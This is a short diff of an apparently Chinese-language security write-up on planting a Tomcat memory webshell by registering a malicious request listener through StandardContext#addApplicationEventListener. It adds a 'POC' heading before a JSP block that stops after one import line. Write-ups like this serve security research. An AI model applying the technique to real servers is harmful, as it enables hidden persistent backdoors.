@@ -106,8 +106,9 @@ public boolean fireRequestInitEvent(ServletRequest request) {
 }
 ```
 
-我们将恶意代码存在`requestInitialized()`方法中
 通过`StandardContext#addApplicationEventListener`将我们构造的Listener放进去
+
+# 0x03 POC
 
 ```jsp
 <%@ page import="org.apache.catalina.core.StandardContext" %>
